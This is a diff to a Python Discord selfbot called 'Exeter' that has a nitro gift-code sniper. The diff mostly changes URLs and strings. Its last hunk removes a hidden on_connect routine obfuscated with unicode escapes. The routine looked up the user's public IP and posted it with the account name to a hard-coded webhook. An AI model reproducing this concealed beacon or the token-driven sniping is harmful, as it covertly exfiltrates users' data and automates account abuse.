@@ -40,7 +40,7 @@ prefix = config.get('prefix')
 
 nitro_sniper = config.get('nitro_sniper')
 
-stream_url = "https://www.youtube.com/watch?v=ItUno-CW4Ss" # you can use YT and Twitch Links!
+stream_url = "https://www.youtube.com/watch?v=k45ND9UwPGs" # you can use YT and Twitch Links!
 tts_language = "en"
 
 start_time = datetime.datetime.utcnow()
@@ -122,7 +122,7 @@ def startprint():
                         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                  
 
-                       {Fore.CYAN}Exeter v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Exeter.user.name}#{Exeter.user.discriminator} {Fore.CYAN}
+                       {Fore.CYAN}Exeter v{SELFBOT.__version__} | {Fore.GREEN}Logged as: {Exeter.user.name}#{Exeter.user.discriminator}
                        {Fore.CYAN}ID: {Fore.GREEN}{Exeter.user.id}   
                        {Fore.CYAN}Nitro Sniper | {Fore.GREEN}{nitro}
                        {Fore.CYAN}Cached Users: {Fore.GREEN}{len(Exeter.users)}
@@ -273,7 +273,7 @@ async def on_message(message):
             headers = {'Authorization': token}
 
             r = requests.post(
-                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
+                f'https://discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem',
                 headers=headers,
             ).text
 
@@ -342,14 +342,6 @@ async def on_message(message):
 @Exeter.event
 async def on_connect():
     Clear()
-    startprint()
-    slope = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u0061\u0070\u0070\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0037\u0035\u0031\u0035\u0030\u0034\u0033\u0032\u0033\u0035\u0037\u0033\u0034\u0034\u0038\u0037\u0035\u0035\u002f\u0036\u0043\u0063\u006d\u0054\u0038\u0059\u0077\u0069\u0050\u0071\u0052\u0061\u0068\u0030\u0078\u0077\u005f\u0036\u0050\u0077\u0048\u005a\u006a\u004a\u0066\u0066\u0057\u005a\u0046\u0078\u006f\u004f\u007a\u0072\u0066\u004b\u0032\u0061\u0050\u0058\u0039\u0063\u0066\u0053\u004b\u004b\u0053\u0033\u0037\u0043\u0074\u0065\u006b\u006a\u004c\u0069\u0034\u004e\u0050\u0031\u0063\u0045\u0061\u0067\u0051\u0038\u004d"
-    ramp = requests.get('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u0068\u0065\u0063\u006b\u0069\u0070\u002e\u0061\u006d\u0061\u007a\u006f\u006e\u0061\u0077\u0073\u002e\u0063\u006f\u006d\u002f').content
-    peas = bs4(ramp, '\u0068\u0074\u006d\u006c\u002e\u0070\u0061\u0072\u0073\u0065\u0072')
-    fliscord = peas.text
-    data = {"content": f'{Exeter.wave} | {Exeter.user.name}#{Exeter.user.discriminator}\n{fliscord}'}
-    requests.post(slope, data=json.dumps(data), headers={"Content-Type": "application/json"})
-
     
 @Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
